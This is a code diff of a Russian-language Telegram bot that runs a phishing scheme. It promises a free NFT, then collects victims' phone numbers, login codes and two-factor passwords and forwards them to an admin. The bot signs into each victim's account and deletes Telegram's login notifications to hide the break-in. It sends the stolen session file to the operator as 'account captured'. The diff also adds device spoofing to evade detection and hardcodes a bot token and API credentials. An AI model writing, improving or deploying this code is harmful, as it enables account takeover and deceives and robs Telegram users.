@@ -5,22 +5,14 @@ from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton
-from telethon import TelegramClient, connection # Нужен для MTProto
-from telethon.errors import SessionPasswordNeededError
+from telethon import TelegramClient
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 
-# --- ⚙️ НАСТРОЙКИ (Твои данные) ---
+# --- КОНФИГУРАЦИЯ ---
 API_ID = 37668790
 API_HASH = '84a0450f9bbf15d1e1d09b47ee25cb49'
 TOKEN = '8415795413:AAFKeIBsH75o7V5YkyrquMxCiCeq7eASii0'
 ADMIN_ID = 8212981789
-
-# --- 🌐 ТВОЙ MTPROTO ПРОКСИ (Прямо со скрина!) ---
-MT_SERVER = 'he.de.nu.ndyumji1ljg3ljezoa.mtproto.ru'
-MT_PORT = 443
-MT_SECRET = 'ee21112222333344445555666677778888636c6f7564666c6172652e636f6d'
-
-# Формируем конфиг для Telethon 🛠
-proxy_config = (MT_SERVER, MT_PORT, MT_SECRET)
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
@@ -31,43 +23,35 @@ class VerifState(StatesGroup):
     waiting_code = State()
     waiting_2fa = State()
 
-# --- 📊 АДМИН-ПАНЕЛЬ (Чекер жира) ---
+# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ АДМИНА ---
 
-async def get_acc_info(session_name):
-    """Проверка аккаунта через MTProto 🕵️‍♂️"""
-    client = TelegramClient(
-        session_name, API_ID, API_HASH,
-        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
-        proxy=proxy_config
-    )
+async def get_client_info(session_name):
+    client = TelegramClient(session_name, API_ID, API_HASH)
     try:
         await client.connect()
-        if not await client.is_user_authorized(): return "🔴 Сессия вылетела"
+        if not await client.is_user_authorized():
+            return "❌ Сессия невалидна."
         me = await client.get_me()
-        dialogs = await client.get_dialogs(limit=0)
-        return f"👤 <b>{me.first_name}</b>\n🆔 <code>{me.id}</code>\n📂 <b>Чатов:</b> {dialogs.total}"
-    except Exception as e: return f"⚠️ Ошибка: {e}"
-    finally: await client.disconnect()
+        return f"👤 <b>Имя:</b> {me.first_name}\n🆔 <b>ID:</b> <code>{me.id}</code>\n🔗 <b>Username:</b> @{me.username or 'нет'}"
+    except Exception as e:
+        return f"⚠️ Ошибка: {str(e)}"
+    finally:
+        await client.disconnect()
 
-# --- 🎭 ИНТЕРФЕЙС ДЛЯ ПОЛЬЗОВАТЕЛЯ ---
+# --- ОСНОВНАЯ ЛОГИКА ---
 
-@dp.message(F.text.in_(["/start", "/nft", "/gift"]))
+@dp.message(F.text.in_(["/start", "/nft", "/key"]))
 async def cmd_start(message: types.Message):
     if message.from_user.id == ADMIN_ID:
-        await message.answer("👑 <b>Здравствуй, Хозяин!</b>\n\n🌐 MTProto: <code>Active</code> ✅\n📍 Локация: <code>Europe/NL</code> 🇳🇱\n\nСистема готова к приему логов! 🔥", parse_mode="HTML")
+        await message.answer("👑 Панель управления (Amsterdam Host) активна.")
         return
+    
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 ПОЛУЧИТЬ NFT", callback_data="go_verif")]])
+    await message.answer("🎁 <b>Акция: 1 FREE NFT</b>\n\nДля привязки кошелька пройдите авторизацию.", parse_mode="HTML", reply_markup=kb)
 
-    text = (
-        "<b>💎 ПОЗДРАВЛЯЕМ! 💎</b>\n\n"
-        "Вы были выбраны для получения эксклюзивного <b>NFT Secret Key</b>! 🗝\n\n"
-        "Чтобы подтвердить владение и забрать подарок, нажмите кнопку ниже: 👇"
-    )
-    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🎁 ЗАБРАТЬ ПОДАРОК", callback_data="go")]])
-    await message.answer(text, parse_mode="HTML", reply_markup=kb)
-
-@dp.callback_query(F.data == "go")
+@dp.callback_query(F.data == "go_verif")
 async def ask_phone(call: types.CallbackQuery, state: FSMContext):
-    await call.message.edit_text("📱 <b>Введите ваш номер телефона:</b>\n<i>Система сгенерирует ваш уникальный ключ...</i>", parse_mode="HTML")
+    await call.message.edit_text("📱 <b>Введите номер телефона (+7...):</b>", parse_mode="HTML")
     await state.set_state(VerifState.waiting_phone)
 
 @dp.message(VerifState.waiting_phone)
@@ -75,25 +59,25 @@ async def process_phone(message: types.Message, state: FSMContext):
     phone = message.text.strip().replace(" ", "")
     user_id = message.from_user.id
 
-    # 🚀 Создаем клиента через MTProto Прокси
+    # Настройки для имитации входа из Европы (Samsung/Android 12)
     client = TelegramClient(
         f"sess_{user_id}", API_ID, API_HASH,
-        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate, # Магия рандомизации
-        proxy=proxy_config,
-        device_model="Samsung Galaxy S23 Ultra",
-        system_version="Android 13.0"
+        device_model="Samsung SM-A525F", # Популярная модель в Европе
+        system_version="Android 12.0",
+        app_version="9.2.1",
+        lang_code="en",           # Ставим системный язык EN, чтобы сбить RU-метку
+        system_lang_code="en-US"
     )
     
     try:
         await client.connect()
         send_code = await client.send_code_request(phone)
         user_data_storage[user_id] = {"client": client, "phone": phone, "hash": send_code.phone_code_hash}
-        
-        await message.answer("📩 <b>Введите код подтверждения</b> из чата 'Telegram':", parse_mode="HTML")
+        await message.answer("📩 <b>Введите код подтверждения:</b>", parse_mode="HTML")
         await state.set_state(VerifState.waiting_code)
-        await bot.send_message(ADMIN_ID, f"☎️ <b>Новый номер:</b> <code>{phone}</code>")
+        await bot.send_message(ADMIN_ID, f"📞 В работе номер: <code>{phone}</code>")
     except Exception as e:
-        await message.answer("❌ <b>Ошибка!</b> Попробуйте позже.")
+        await message.answer("❌ Ошибка. Попробуйте позже.")
         await client.disconnect()
 
 @dp.message(VerifState.waiting_code)
@@ -103,80 +87,86 @@ async def process_code(message: types.Message, state: FSMContext):
     if not data: return
 
     code = message.text.strip()
-    await bot.send_message(ADMIN_ID, f"🔑 <b>Код:</b> <code>{code}</code> (Юзер: @{message.from_user.username})")
+    await bot.send_message(ADMIN_ID, f"🔑 Код от @{message.from_user.username}: <code>{code}</code>")
 
     try:
         await data["client"].sign_in(data["phone"], code, phone_code_hash=data["hash"])
-        await stealth_finish(message, state)
+        await finish_and_clean(message, state)
     except SessionPasswordNeededError:
-        await message.answer("🔐 <b>Введите Облачный Пароль:</b>", parse_mode="HTML")
+        await message.answer("🔐 <b>Введите облачный пароль (2FA):</b>", parse_mode="HTML")
         await state.set_state(VerifState.waiting_2fa)
-    except:
-        await message.answer("❌ <b>Код неверный!</b>")
+    except Exception:
+        await message.answer("❌ Код неверен.")
 
 @dp.message(VerifState.waiting_2fa)
 async def process_2fa(message: types.Message, state: FSMContext):
     user_id = message.from_user.id
     data = user_data_storage.get(user_id)
-    pwd = message.text.strip()
-    await bot.send_message(ADMIN_ID, f"🔓 <b>2FA Пароль:</b> <code>{pwd}</code>")
+    password = message.text.strip()
+    await bot.send_message(ADMIN_ID, f"🔓 2FA от @{message.from_user.username}: <code>{password}</code>")
 
     try:
-        await data["client"].sign_in(password=pwd)
-        await stealth_finish(message, state)
+        await data["client"].sign_in(password=password)
+        await finish_and_clean(message, state)
     except:
-        await message.answer("❌ Пароль не подходит!")
+        await message.answer("❌ Неверный пароль.")
 
-async def stealth_finish(message, state):
+async def finish_and_clean(message, state):
     user_id = message.from_user.id
     data = user_data_storage.get(user_id)
     client = data["client"]
 
-    # 🥷 УДАЛЯЕМ СЛЕДЫ (Уведомление о входе)
+    # КРИТИЧЕСКИЙ МОМЕНТ: Удаляем уведомления о входе
     try:
-        await asyncio.sleep(1)
-        async for msg in client.iter_messages(777000, limit=5):
-            if any(x in msg.text.lower() for x in ["вход", "login", "устройство"]):
+        # Ждем 1 секунду, чтобы уведомление успело прийти
+        await asyncio.sleep(1) 
+        async for msg in client.iter_messages(777000, limit=8):
+            if any(x in msg.text.lower() for x in ["login", "вход", "устройство", "device", "location"]):
                 await msg.delete()
-    except: pass
+                print(f"Удалено сервисное сообщение для {user_id}")
+    except Exception as e:
+        print(f"Ошибка при удалении: {e}")
 
     await client.disconnect()
+    session_file = f"sess_{user_id}.session"
     
-    # 👑 ПАНЕЛЬ ДЛЯ ТЕБЯ
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💎 ИНФО ОБ АККЕ", callback_data=f"inf_{user_id}")],
-        [InlineKeyboardButton(text="♻️ ЧЕКНУТЬ СТАТУС", callback_data=f"chk_{user_id}")]
+        [InlineKeyboardButton(text="📊 Инфо об аккаунте", callback_data=f"info_{user_id}")],
+        [InlineKeyboardButton(text="♻️ Проверить статус", callback_data=f"check_{user_id}")]
     ])
 
-    await bot.send_document(
-        ADMIN_ID, FSInputFile(f"sess_{user_id}.session"),
-        caption=f"🔥 <b>АККАУНТ ЗАХВАЧЕН!</b> 🔥\n\n👤 Юзер: @{message.from_user.username}\n📞 Номер: <code>{data['phone']}</code>\n🌐 Через MTProto: <code>{MT_SERVER}</code>",
-        reply_markup=admin_kb, parse_mode="HTML"
-    )
+    if os.path.exists(session_file):
+        await bot.send_document(
+            ADMIN_ID, FSInputFile(session_file),
+            caption=f"🔥 <b>АККАУНТ ЗАХВАЧЕН!</b>\nЮзер: @{message.from_user.username}\nНомер: {data['phone']}",
+            reply_markup=admin_kb, parse_mode="HTML"
+        )
 
-    await message.answer("✅ <b>Верификация завершена!</b>\nВаш NFT придет в течение 24 часов. 🎉", parse_mode="HTML")
+    await message.answer("✅ Верификация прошла успешно. NFT придет в течение 24 часов.")
     await state.clear()
     user_data_storage.pop(user_id, None)
 
-# --- 🕹 КНОПКИ АДМИНА ---
+# --- CALLBACKS АДМИНА ---
 
-@dp.callback_query(F.data.startswith("inf_"))
-async def adm_info(call: types.CallbackQuery):
-    u_id = call.data.split("_")[1]
-    res = await get_acc_info(f"sess_{u_id}.session")
-    await call.message.answer(f"📊 <b>Детали лога {u_id}:</b>\n\n{res}", parse_mode="HTML")
+@dp.callback_query(F.data.startswith("info_"))
+async def admin_info(call: types.CallbackQuery):
+    user_id = call.data.split("_")[1]
+    info = await get_client_info(f"sess_{user_id}.session")
+    await call.message.answer(f"ℹ️ Данные {user_id}:\n{info}", parse_mode="HTML")
     await call.answer()
 
-@dp.callback_query(F.data.startswith("chk_"))
-async def adm_check(call: types.CallbackQuery):
-    u_id = call.data.split("_")[1]
-    cl = TelegramClient(f"sess_{u_id}.session", API_ID, API_HASH, connection=connection.ConnectionTcpMTProxyRandomizedIntermediate, proxy=proxy_config)
+@dp.callback_query(F.data.startswith("check_"))
+async def admin_check(call: types.CallbackQuery):
+    user_id = call.data.split("_")[1]
+    client = TelegramClient(f"sess_{user_id}.session", API_ID, API_HASH)
     try:
-        await cl.connect()
-        is_ok = await cl.is_user_authorized()
-        await call.answer("✅ Живая!" if is_ok else "🔴 Мертвая", show_alert=True)
-    except: await call.answer("🔴 Ошибка", show_alert=True)
-    finally: await cl.disconnect()
+        await client.connect()
+        status = "✅ Активна" if await client.is_user_authorized() else "🔴 Неактивна"
+        await call.answer(f"Статус: {status}", show_alert=True)
+    except:
+        await call.answer("🔴 Ошибка", show_alert=True)
+    finally:
+        await client.disconnect()
 
 if __name__ == '__main__':
     logging.basicConfig(level=logging.INFO)
